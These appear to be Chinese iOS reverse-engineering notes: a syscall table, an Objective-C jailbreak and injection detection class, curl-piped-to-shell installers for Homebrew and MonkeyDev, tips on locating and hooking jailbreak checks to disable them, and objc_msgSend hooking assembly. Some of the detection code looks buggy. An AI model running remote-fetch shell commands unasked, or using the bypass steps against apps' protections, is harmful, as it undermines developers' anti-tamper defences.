 92 mk_timer_destroy_trap                    8001f500 T
 93 mk_timer_arm_trap                        8001f544 T
 94 mk_timer_cancel_trap                     8001f5c8 T
100 iokit_user_client_trap                   8026c11c T
```
## Apple提供的System Call Table 可以查出函数的编号
```

1. exit                  801d4a74 T
2. fork                  801d7980 T
3. read                  801eb584 T
4. write                 801eb958 T
5. open                  800b13a4 T
6. close                 801ccab4 T
7. wait4                 801d56bc T
9. link                  800b18e8 T
10. unlink               800b1ff0 T
12. chdir                800b0c60 T
13. fchdir               800b0af0 T
14. mknod                800b14bc T
15. chmod                800b2b40 T
16. chown                800b2c9c T
18. getfsstat            800b088c T
20. getpid               801dc20c T
23. setuid               801dc4c0 T
24. getuid               801dc290 T
25. geteuid              801dc2a0 T
26. ptrace               801e812c T
27. recvmsg              8020a8fc T
28. sendmsg              8020a444 T
29. recvfrom             8020a528 T
30. accept               80209dfc T
31. getpeername          8020abc8 T
32. getsockname          8020ab18 T
33. access               800b24ac T
34. chflags              800b2928 T
35. fchflags             800b29f0 T
36. sync                 800b0320 T
37. kill                 801dfdcc T
39. getppid              801dc214 T
41. dup                  801cab04 T
42. pipe                 801edbe4 T
43. getegid              801dc318 T
46. sigaction            801deee8 T
47. getgid               801dc308 T
48. sigprocmask          801df42c T
49. getlogin             801dd0e8 T
50. setlogin             801dd160 T
51. acct                 801c54ec T
52. sigpending           801df5d0 T
53. sigaltstack          801dfd10 T
54. ioctl                801ebd1c T
55. reboot               801e8090 T
56. revoke               800b43f8 T
57. symlink              800b1b58 T
58. readlink             800b282c T
59. execve               801d4448 T
60. umask                800b43d0 T
61. chroot               800b0d30 T
65. msync                801d84d0 T
66. vfork                801d7018 T
73. munmap               801d857c T
74. mprotect             801d85b0 T
75. madvise              801d8668 T
78. mincore              801d86d4 T
79. getgroups            801dc328 T
80. setgroups            801dd02c T
81. getpgrp              801dc21c T
82. setpgid              801dc3c8 T
83. setitimer            801e7b78 T
85. swapon               8021be68 T
86. getitimer            801e7a30 T
89. getdtablesize        801ca6dc T
90. dup2                 801caf54 T
92. fcntl                801cb420 T
93. select               801ebfc8 T
95. fsync                800b3238 T
96. setpriority          801dd494 T
97. socket               802098a4 T
98. connect              80209e1c T
100. getpriority          801dd388 T
104. bind                 80209970 T
105. setsockopt           8020aa30 T
106. listen               80209adc T
 111. sigsuspend           801df5f8 T
116. gettimeofday         801e7840 T
117. getrusage            801de22c T
118. getsockopt           8020aa94 T
120. readv                801eb810 T
121. writev               801ebbb0 T
122. settimeofday         801e789c T
123. fchown               800b2dac T
124. fchmod               800b2c70 T
126. setreuid             801dc80c T
127. setregid             801dcba0 T
128. rename               800b3428 T
131. flock                801ce20c T
132. mkfifo               800b1798 T
133. sendto               8020a168 T
134. shutdown             8020aa00 T
135. socketpair           8020a00c T
136. mkdir                800b3d1c T
137. rmdir                800b3d5c T
138. utimes               800b2e60 T
139. futimes              800b3034 T
140. adjtime              801e79a0 T
142. gethostuuid          801ed6a4 T
147. setsid               801dc384 T
151. getpgid              801dc224 T
152. setprivexec          801dc1f4 T
153. pread                801eb774 T
154. pwrite               801ebad0 T
157. statfs               800b03c0 T
158. fstatfs              800b0678 T
159. unmount              800afe88 T
165. quotactl             800b03bc T
167. mount                800af068 T
169. csops                801dafd0 T
170. 170  old table       801db4bc T
173. waitid               801d5ab4 T
180. kdebug_trace         801c2db4 T
181. setgid               801dc9a4 T
182. setegid              801dcab0 T
183. seteuid              801dc710 T
184. sigreturn            8021e7e4 T
185. chud                 8021d4f4 T
187. fdatasync            800b32b0 T
188. stat                 800b2588 T
189. fstat                801ccfec T
190. lstat                800b26d4 T
191. pathconf             800b27c8 T
192. fpathconf            801cd048 T
194. getrlimit            801de074 T
195. setrlimit            801dd93c T
196. getdirentries        800b3f94 T
197. mmap                 801d7fc0 T
199. lseek                800b2068 T
200. truncate             800b30b4 T
201. ftruncate            800b3174 T
202. __sysctl             801e2478 T
203. mlock                801d8820 T
204. munlock              801d8878 T
205. undelete             800b1cf0 T
216. mkcomplex            800b12c4 T
220. getattrlist          8009b060 T
221. setattrlist          8009b0d8 T
222. getdirentriesattr    800b44e0 T
223. exchangedata         800b469c T
225. searchfs             800b48dc T
226. delete               800b202c T
227. copyfile             800b32cc T
228. fgetattrlist         80098488 T
229. fsetattrlist         8009b7e0 T
230. poll                 801ec72c T
231. watchevent           801ed054 T
232. waitevent            801ed1f8 T
233. modwatch             801ed368 T
234. getxattr             800b5550 T
235. fgetxattr            800b568c T
236. setxattr             800b578c T
237. fsetxattr            800b5898 T
238. removexattr          800b5994 T
239. fremovexattr         800b5a5c T
240. listxattr            800b5b1c T
241. flistxattr           800b5c00 T
242. fsctl                800b4dd4 T
243. initgroups           801dcea8 T
244. posix_spawn          801d351c T
245. ffsctl               800b5474 T
250. minherit             801d8630 T
266. shm_open             8020eb24 T
267. shm_unlink           8020f604 T
268. sem_open             8020df80 T
269. sem_close            8020e718 T
270. sem_unlink           8020e4e0 T
271. sem_wait             8020e76c T
272. sem_trywait          8020e834 T
273. sem_post             8020e8d8 T
274. sem_getvalue         8020e97c T
275. sem_init             8020e974 T
276. sem_destroy          8020e978 T
277. open_extended        800b11d8 T
278. umask_extended       800b4380 T
279. stat_extended        800b2530 T
280. lstat_extended       800b267c T
281. fstat_extended       801ccdd0 T
282. chmod_extended       800b2a30 T
283. fchmod_extended      800b2b74 T
284. access_extended      800b21a0 T
285. settid               801dcd2c T
286. gettid               801dc2b0 T
287. setsgroups           801dd03c T
288. getsgroups           801dc37c T
289. setwgroups           801dd040 T
290. getwgroups           801dc380 T
291. mkfifo_extended      800b16f4 T
292. mkdir_extended       800b3b30 T
294. shared_region_check_np 8021c3a4 T
296. vm_pressure_monitor  8021cb08 T
297. psynch_rw_longrdlock 802159ac T
298. psynch_rw_yieldwrlock 80215c60 T
299. psynch_rw_downgrade  80215c68 T
300. psynch_rw_upgrade    80215c64 T
301. psynch_mutexwait     80212bd8 T
302. psynch_mutexdrop     80213b9c T
303. psynch_cvbroad       80213bf0 T
304. psynch_cvsignal      802141c0 T
305. psynch_cvwait        80214648 T
306. psynch_rw_rdlock     80214d7c T
307. psynch_rw_wrlock     802159b0 T
308. psynch_rw_unlock     80215c6c T
309. psynch_rw_unlock2    80215f64 T
310. getsid               801dc254 T
311. settid_with_pid      801dcdcc T
312. psynch_cvclrprepost  80214c7c T
313. aio_fsync            801c5ed0 T
314. aio_return           801c60a8 T
315. aio_suspend          801c6330 T
316. aio_cancel           801c5a48 T
317. aio_error            801c5e24 T
318. aio_read             801c6088 T
319. aio_write            801c6544 T
320. lio_listio           801c6564 T
322. iopolicysys          801de420 T
323. process_policy       8021a72c T
324. mlockall             801d88b4 T
325. munlockall           801d88b8 T
327. issetugid            801dc4b0 T
328. __pthread_kill       801dfa44 T
329. __pthread_sigmask    801dfaa4 T
330. __sigwait            801dfb54 T
331. __disable_threadsignal 801df720 T
332. __pthread_markcancel 801df73c T
333. __pthread_canceled   801df784 T
334. __semwait_signal     801df924 T
336. proc_info            80218618 T
338. stat64               800b25d4 T
339. fstat64              801cd028 T
340. lstat64              800b2720 T
341. stat64_extended      800b2624 T
342. lstat64_extended     800b2770 T
343. fstat64_extended     801cd00c T
344. getdirentries64      800b4340 T
345. statfs64             800b06e0 T
346. fstatfs64            800b0828 T
347. getfsstat64          800b0a38 T
348. __pthread_chdir      800b0d28 T
349. __pthread_fchdir     800b0c58 T
350. audit                801c1a74 T
351. auditon              801c1a78 T
353. getauid              801c1a7c T
354. setauid              801c1a80 T
357. getaudit_addr        801c1a84 T
358. setaudit_addr        801c1a88 T
359. auditctl             801c1a8c T
360. bsdthread_create     80216ab8 T
361. bsdthread_terminate  80216d30 T
362. kqueue               801cf594 T
363. kevent               801cf614 T
364. lchown               800b2d94 T
365. stack_snapshot       801c520c T
366. bsdthread_register   80216d94 T
367. workq_open           802179e8 T
368. workq_kernreturn     80217e50 T
369. kevent64             801cf8ac T
370. __old_semwait_signal 801df7f8 T
371. __old_semwait_signal_nocancel 801df82c T
372. thread_selfid        80218354 T
373. ledger               801ed70c T
380. __mac_execve         801d4468 T
381. __mac_syscall        8027d0a8 T
382. __mac_get_file       8027cd50 T
383. __mac_set_file       8027cf98 T
384. __mac_get_link       8027ce74 T
385. __mac_set_link       8027d098 T
386. __mac_get_proc       8027c844 T
387. __mac_set_proc       8027c904 T
388. __mac_get_fd         8027cbfc T
389. __mac_set_fd         8027ce84 T
390. __mac_get_pid        8027c778 T
391. __mac_get_lcid       8027c9b8 T
392. __mac_get_lctx       8027ca7c T
393. __mac_set_lctx       8027cb38 T
394. setlcid              801dd228 T
395. getlcid              801dd310 T
396. read_nocancel        801eb5a4 T
397. write_nocancel       801eb978 T
398. open_nocancel        800b1434 T
399. close_nocancel       801ccad0 T
400. wait4_nocancel       801d56dc T
401. recvmsg_nocancel     8020a91c T
402. sendmsg_nocancel     8020a464 T
403. recvfrom_nocancel    8020a548 T
404. accept_nocancel      80209b1c T
405. msync_nocancel       801d84e8 T
406. fcntl_nocancel       801cb440 T
407. select_nocancel      801ebfe4 T
408. fsync_nocancel       800b32a8 T
409. connect_nocancel     80209e34 T
410. sigsuspend_nocancel  801df6b4 T
411. readv_nocancel       801eb830 T
412. writev_nocancel      801ebbd0 T
413. sendto_nocancel      8020a188 T
414. pread_nocancel       801eb794 T
415. pwrite_nocancel      801ebaf0 T
416. waitid_nocancel      801d5ad0 T
417. poll_nocancel        801ec74c T
420. sem_wait_nocancel    8020e788 T
421. aio_suspend_nocancel 801c6350 T
422. __sigwait_nocancel   801dfb8c T
423. __semwait_signal_nocancel 801df958 T
424. __mac_mount          800af08c T
425. __mac_get_mount      8027d2a0 T
426. __mac_getfsstat      800b08b0 T
427. fsgetpath            800b5ce4 T
428. audit_session_self   801c1a68 T
429. audit_session_join   801c1a6c T
430. fileport_makeport    801ce2f0 T
431. fileport_makefd      801ce494 T
432. audit_session_port   801c1a70 T
433. pid_suspend          8021c180 T
434. pid_resume           8021c1f0 T
435. pid_hibernate        8021c268 T
436. pid_shutdown_sockets 8021c2c0 T
438. shared_region_map_and_slide_np 8021c954 T
439. kas_info             8021cb50 T   ; Provides ASLR information to user space 
                                       ; (intentionally crippled in iOS, works in ML)
440. memorystatus_control 801e62a0 T   ;; Controls JetSam - supersedes old sysctl interface
441. guarded_open_np      801cead0 T  
442. guarded_close_np     801cebdc T

```

## iPhoneIsJailbroken
```
#import "iPhoneIsJailbroken.h"
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>

@implementation iPhoneIsJailbroken

#define A(c)            (c) - 0x19
#define HIDE_STR(str)   do { char *p = str;  while (*p) *p++ -= 0x19; } while (0)
typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

BOOL DEBUGGING = YES;

#if TARGET_IPHONE_SIMULATOR && !defined(LC_ENCRYPTION_INFO)
#define LC_ENCRYPTION_INFO 0x21
struct encryption_info_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint32_t cryptoff;
    uint32_t cryptsize;
    uint32_t cryptid;
};
#endif

void LOG(NSString* loc)
{
    NSLog(@"Found: %@", loc);
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

// Preventing libobjc hooked, strstr implementation
const char* tuyul(const char* X, const char* Y)
{
    if (*Y == '\0')
        return X;

    for (int i = 0; i < strlen(X); i++)
    {
        if (*(X + i) == *Y)
        {
            char* ptr = tuyul(X + i + 1, Y + 1);
            return (ptr) ? ptr - 1 : NULL;
        }
    }

    return NULL;
}

BOOL isJb()
{
//    Check cydia URL
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }
    NSArray* checks = [[NSArray alloc]initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app",
                       @"/var/checkra1n.dmg",
                       @"/var/binpack",
                       nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            if(DEBUGGING){LOG(check);}
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            if(DEBUGGING){LOG(@"Symlink");}
            return YES;
        }
    }
    
    //Check process forking
    int pid = fork();
    if(!pid)
    {
        exit(1);
    }
    if(pid >= 0)
    {
        if(DEBUGGING){LOG(@"Fork");}
        return YES;
    }
    
    //Check permission to write to /private
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:test atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            if(DEBUGGING){LOG(@"File creation");}
            return YES;
        }
        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

char* UNHIDE_STR(char* str){
    do { char *p = str;  while (*p) *p++ += 0x19; } while (0);
    return str;
}

char* decryptString(char* str){
    str = UNHIDE_STR(str);
    str[strlen(str)]='\0';
    return str;
}

BOOL isInjectedWithDynamicLibrary()
{
    int i=0;
    while(true){
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
            char cyinjectHide[] = {
                A('c'),
                A('y'),
                A('i'),
                A('n'),
                A('j'),
                A('e'),
                A('c'),
                A('t'),
                0
            };
            char libcycriptHide[] = {
                A('l'),
                A('i'),
                A('b'),
                A('c'),
                A('y'),
                A('c'),
                A('r'),
                A('i'),
                A('p'),
                A('t'),
                0
            };
            
            char libfridaHide[] = {
                A('F'),
                A('r'),
                A('i'),
                A('d'),
                A('a'),
                A('G'),
                A('a'),
                A('d'),
                A('g'),
                A('e'),
                A('t'),
                0
            };
            char zzzzLibertyDylibHide[] = {
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('L'),
                A('i'),
                A('b'),
                A('e'),
                A('r'),
                A('t'),
                A('y'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            char sslkillswitch2dylib[] = {
                A('S'),
                A('S'),
                A('L'),
                A('K'),
                A('i'),
                A('l'),
                A('l'),
                A('S'),
                A('w'),
                A('i'),
                A('t'),
                A('c'),
                A('h'),
                A('2'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char zeroshadowdylib[] = {
                A('0'),
                A('S'),
                A('h'),
                A('a'),
                A('d'),
                A('o'),
                A('w'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char mobilesubstratedylib[] = {
                A('M'),
                A('o'),
                A('b'),
                A('i'),
                A('l'),
                A('e'),
                A('S'),
                A('u'),
                A('b'),
                A('s'),
                A('t'),
                A('r'),
                A('a'),
                A('t'),
                A('e'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char libsparkapplistdylib[] = {
                A('l'),
                A('i'),
                A('b'),
                A('s'),
                A('p'),
                A('a'),
                A('r'),
                A('k'),
                A('a'),
                A('p'),
                A('p'),
                A('l'),
                A('i'),
                A('s'),
                A('t'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char SubstrateInserterdylib[] = {
                A('S'),
                A('u'),
                A('b'),
                A('s'),
                A('t'),
                A('r'),
                A('a'),
                A('t'),
                A('e'),
                A('I'),
                A('n'),
                A('s'),
                A('e'),
                A('r'),
                A('t'),
                A('e'),
                A('r'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char zzzzzzUnSubdylib[] = {
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('U'),
                A('n'),
                A('S'),
                A('u'),
                A('b'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
                
            };
            
            char kor[] = {
                A('.'),
                A('.'),
                A('.'),
                A('!'),
                A('@'),
                A('#'),
                0
            };
            char cephei[] = {
                A('/'),A('u'),A('s'),A('r'),A('/'),A('l'),A('i'),A('b'),A('/'),A('C'),A('e'),A('p'),A('h'),A('e'),A('i'),A('.'),A('f'),A('r'),A('a'),A('m'),A('e'),A('w'),A('o'),A('r'),A('k'),A('/'),A('C'),A('e'),A('p'),A('h'),A('e'),A('i'),
                0
            };
            if (tuyul(name, decryptString(cephei)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(kor)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(mobilesubstratedylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if(tuyul(name, decryptString(libsparkapplistdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(cyinjectHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(libcycriptHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(libfridaHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zzzzLibertyDylibHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(sslkillswitch2dylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zeroshadowdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(SubstrateInserterdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zzzzzzUnSubdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
        }
    }
    return NO;
}

// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

BOOL isFromAppStore()
{
    #if TARGET_IPHONE_SIMULATOR
        return NO;
    #else
        NSString *provisionPath = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
        if (nil == provisionPath || 0 == provisionPath.length) {
            return YES;
        }
        return NO;
    #endif
}

BOOL isSecurityCheckPassed()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !isJb() && !isInjectedWithDynamicLibrary() && !isDebugged();
    
}

@end
```

## Homebrew国内安装
### 自动脚本(全部国内地址)（在Mac终端中复制粘贴回车下面脚本)
安装脚本：
```
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)"
```
卸载脚本：
```
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)"
```

## curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to raw.githubusercontent.com:443 
### 此处出现报错, 证明当前网络不行, 切换另外的网络/热点就行
```
$     sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to raw.githubusercontent.com:443 
此处出现报错, 证明当前网络不行, 切换另外的网络/热点就行
Password:
$     sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
Downloading MonkeyDev base from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3452k  100 3452k    0     0   4256      0  0:13:50  0:13:50 --:--:-- 10751
Downloading Xcode templates from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  306k    0  306k    0     0  16915      0 --:--:--  0:00:18 --:--:-- 14798
Downloading frida-ios-dump from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9669  100  9669    0     0   1012      0  0:00:09  0:00:09 --:--:--   396
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11727  100 11727    0     0   3273      0  0:00:03  0:00:03 --:--:--  3273
Creating symlink to Xcode templates...
Modifying Bash personal initialization file...
   
```

## 如何检测越狱设备
为方便起见，“恶意应用程序”将指App Store中任何可主动实施越狱检测措施的应用程序。
在大多数情况下，越狱检测程序并不像人们想象的那么复杂。尽管应用程序可以采用多种方式对越狱设备进行检查，但通常可以归结为以下几点：

目录的存在 -流氓应用喜欢在文件系统中检查/Applications/Cydia.app/和/ private / var / stash等路径。
大多数情况下，这些是使用NSFileManager中的-（BOOL）fileExistsAtPath：（NSString *）path方法进行检查的，
但是更多偷偷摸摸的应用程序喜欢使用较低级别的C函数，例如fopen（），stat（）或access（）。

目录权限 -类似于检查目录是否存在，但是使用NSFileManager方法以及statfs（）之类的C函数来检查系统上特定文件和目录的Unix文件权限。
在越狱设备上的目录访问权限要比仍在监狱中的目录要多。

流程fork -沙盒不会拒绝App Store应用程序使用fork（），popen（）或任何其他C函数在越狱设备上创建子进程的能力。
沙盒明确拒绝在越狱中的设备上进行进程fork。通过检查fork（）上返回的pid，流氓应用程序可以判断它是否已成功fork，这时可以确定设备的越狱状态。

SSH环回连接 -只有极少数的应用程序可以实现此目的（因为它不如其他应用程序有效）。
由于安装了OpenSSH的越狱设备的比例很大，某些恶意应用程序将尝试在端口22上建立与127.0.0.1的连接。
如果连接成功，则表明OpenSSH已在设备上安装并运行，这显然表明越狱了

system（） -在监狱中的设备上使用NULL参数调用system（）函数将返回0；否则，将返回0。在越狱设备上执行相同操作将返回1。
这是因为该功能将检查是否/bin/sh存在，并且仅在越狱设备上才如此

dyld函数 -迄今为止最难解决的问题。调用诸如_dyld_image_count（）和_dyld_get_image_name（）之类的函数，以查看当前正在加载哪些dylib。
修补非常困难，因为修补本身就是dylib的一部分。

## 如何对iOS App进行逆向工程
为了从App Store中转储或反汇编应用程序，即使它是免费的应用程序，也必须首先将其解密（通常称为“ 砸壳 ”）。

在应用程序的解密二进制文件上使用class-dump将转储所有头文件。有时，它们包含“赠予”方法名称，
例如“ deviceIsJailbroken”或“ checkDeviceSecurity”。通常，挂接这些方法足以禁用越狱检测措施，但几乎可以保证该补丁将无法在其他应用程序上运行。

使用Objective-C解析功能在IDA中跟踪类似名称的方法可以帮助您准确地确定使用哪种方法来检测越狱。
如果类转储的头文件没有给出任何内容，则在二进制文件中搜索“ jail”，“ cydia”，“ apt”等字符串通常会导致断点。

----------------------------------------------------------------------------------------------------------------
# 汇编语言  Assembly

答：汇编语言是计算机语言，通俗来讲就是人类与计算机(CPU)交流的桥梁，
计算机不认识人类的语言，想要让计算机去完成人们的工作，就需要俺们将这些工作翻译成计算机语言，属于低级计算机语言。

iOS App与汇编语言的关系
一个APP安装到操作系统上面的可执行的文件本质上来讲就是二进制文件，操作系统本质上执行的指令也是二进制，是由CPU执行的；

## Assembly 和 fishhook
Objective-C的方法在编译后会走objc_msgSend，所以通过fishhook来hook这一个C函数即可获得Objective-C符号
由于objc_msgSend是变长参数，所以hook代码需要用汇编来实现：
```
 1//代码参考InspectiveC
 2__attribute__((__naked__))
 3static void hook_Objc_msgSend() {
 4    save()
 5    __asm volatile ("mov x2, lr\n");
 6    __asm volatile ("mov x3, x4\n");
 7    call(blr, &before_objc_msgSend)
 8    load()
 9    call(blr, orig_objc_msgSend)
10    save()
11    call(blr, &after_objc_msgSend)
12    __asm volatile ("mov lr, x0\n");
13    load()
14    ret()
15}
```
子程序调用时候要保存和恢复参数寄存器，
所以save和load分别对x0~x9, q0~q9入栈/出栈。
call则通过寄存器来间接调用函数：
```
 1#define save() \
 2__asm volatile ( \
 3"stp q6, q7, [sp, #-32]!\n"\
 4...
 5
 6#define load() \
 7__asm volatile ( \
 8"ldp x0, x1, [sp], #16\n" \
 9...
10
11#define call(b, value) \
12__asm volatile ("stp x8, x9, [sp, #-16]!\n"); \
13__asm volatile ("mov x12, %0\n" :: "r"(value)); \
14__asm volatile ("ldp x8, x9, [sp], #16\n"); \
15__asm volatile (#b " x12\n");
```
在before_objc_msgSend中用栈保存lr，在after_objc_msgSend恢复lr。
由于要生成trace文件，为了降低文件的大小，直接写入的是函数地址，且只有当前可执行文件的Mach-O(app和动态库)代码段才会写入：

iOS中，由于ALSR(https://en.wikipedia.org/wiki/Address_space_layout_randomization)的存在，在写入之前需要先减去偏移量slide：
```
1IMP imp = (IMP)class_getMethodImplementation(object_getClass(self), _cmd);
2unsigned long imppos = (unsigned long)imp;
3unsigned long addr = immpos - macho_slide
```
获取一个二进制的__text段地址范围：
```
1unsigned long size = 0;
2unsigned long start = (unsigned long)getsectiondata(mhp,  "__TEXT", "__text", &size);
3unsigned long end = start + size;
获取到函数地址后，反查linkmap既可找到方法的符号名。
```

iOS的block是一种特殊的单元，block在编译后的函数体是一个C函数，
在调用的时候直接通过指针调用，并不走objc_msgSend，所以需要单独hook。

通过Block的源码可以看到block的内存布局如下：
```
 1struct Block_layout {
 2    void *isa;
 3    int32_t flags; // contains ref count
 4    int32_t reserved;
 5    void  *invoke;
 6    struct Block_descriptor1 *descriptor;
 7};
 8struct Block_descriptor1 {
 9    uintptr_t reserved;
10    uintptr_t size;
11};
```
其中invoke就是函数的指针，hook思路是将invoke替换为自定义实现，然后在reserved保存为原始实现。
```
1
2if (layout->descriptor != NULL && layout->descriptor->reserved == NULL)
3{
4    if (layout->invoke != (void *)hook_block_envoke)
5    {
6        layout->descriptor->reserved = layout->invoke;
7        layout->invoke = (void *)hook_block_envoke;
8    }
9}
```
由于block对应的函数签名不一样，所以仍然采用汇编来实现hook_block_envoke：
```
 1__attribute__((__naked__))
 2static void hook_block_envoke() {
 3    save()
 4    __asm volatile ("mov x1, lr\n");
 5    call(blr, &before_block_hook);
 6    __asm volatile ("mov lr, x0\n");
 7    load()
 8    //调用原始的invoke，即resvered存储的地址
 9    __asm volatile ("ldr x12, [x0, #24]\n");
10    __asm volatile ("ldr x12, [x12]\n");
11    __asm volatile ("br x12\n");
12}
```

在before_block_hook中获得函数地址（同样要减去slide）。
```
1intptr_t before_block_hook(id block,intptr_t lr)
2{
3    Block_layout * layout = (Block_layout *)block;
4    //layout->descriptor->reserved即block的函数地址
5    return lr;
6}
```
同样，通过函数地址反查linkmap既可找到block符号

